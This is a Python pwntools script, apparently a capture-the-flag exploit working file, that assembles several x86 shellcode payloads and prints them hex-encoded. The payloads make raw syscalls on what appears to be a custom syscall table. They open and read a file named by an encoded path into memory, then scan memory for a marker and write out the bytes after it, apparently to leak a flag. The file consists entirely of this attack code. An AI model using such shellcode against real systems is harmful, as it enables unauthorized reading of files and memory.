from pwn import *
A = """
mov eax, 13
int 0x80

mov eax, 0x02454c46
mov [0x8040000], eax

mov eax, 0
mov ebx, 0x1337
int 0x80
"""

B = """
mov edx, esp

xor eax, eax
push eax
mov eax, 0x65726f6e
push eax
mov eax, 0x67697469
push eax
mov eax, 0x672e2f72
push eax
mov eax, 0x6573752f
push eax



push esp
pop ebx
mov eax, 1

mov esp, edx
int 0x80
"""

C = """
mov eax, 13
int 0x80

mov eax, [0xd048000]
push eax

push esp
pop ecx
mov eax, 5
mov ebx, 0
mov edx, 4
int 0x80

mov eax, 0x1234
"""

def hx(a):
  return asm(a).encode('hex')

pay = asm("""
xor eax, eax
push eax
mov eax, 0x65726f6e
push eax
mov eax, 0x67697469
push eax
mov eax, 0x672e2f72
push eax
mov eax, 0x6573752f
push eax

push esp
pop ebx
mov eax, 2
int 0x80

mov edi, 0x4268
mov esi, 0x0d048000

read_loop:

mov edx, 1
mov eax, ebx
mov ebx, 0x804e1b0
mov eax, 4
int 0x80

mov ebx, 0x804e1b0
mov al, [ebx]
mov [esi], al

inc esi
dec edi 
jnz read_loop

mov eax, 0
mov ebx, 0x1337
int 0x80
""").encode('hex')

C = """
mov eax, 13
int 0x80

mov eax, 0x464c4500
mov [0xd048000], eax
"""


D = """
mov esi, 0x8040000

mov edi, 1
mov edi, 0x40000
do_print:
	  mov edx, esi

    mov eax, [edx]
    cmp eax, 0x63756975
    jne retry
    add edx, 4
    
		mov eax, [edx]
    cmp eax, 0x63756975
    jne retry
		
		dec edi
		jnz retry

		jmp print

retry:
    inc esi
    dec edi
    jnz do_print

		mov eax, 0
		mov ebx, 0x1337
		int 0x80
		
print:
mov edi, 0x10
loop:
    mov eax, [esi]
    mov [0x804e1a0], eax


    mov ebx, 0
    mov ecx, 0x804e1a0
    mov edx, 1
    mov eax, 5
    int 0x80

    inc esi
    dec edi
    jnz loop

mov eax, esi
"""

D = """
mov eax, 11
mov ebx, 0x804e1a8
mov ecx, 0x40000
mov edx, 0x804e1a0
int 0x80

mov eax, 5
mov ebx, 0
mov ecx, esp
sub ecx, 0x20
mov edx, 0x40
int 0x80

mov esi, esp

mov edi, 0x40000
do_print:
	  mov edx, esi

    mov eax, [edx]
    cmp eax, 0x63756975
    jne retry
		
		jmp print

retry:
    inc esi
    dec edi
    jnz do_print

		mov eax, 0
		mov ebx, 0x1337
		int 0x80
		
print:
mov edi, 0x30
loop:
    mov eax, [esi]
    mov [0x804e1a0], eax


    mov ebx, 0
    mov ecx, 0x804e1a0
    mov edx, 1
    mov eax, 5
    int 0x80

    inc esi
    dec edi
    jnz loop

mov eax, esi
"""

print(hx(D))
print(hx(B))
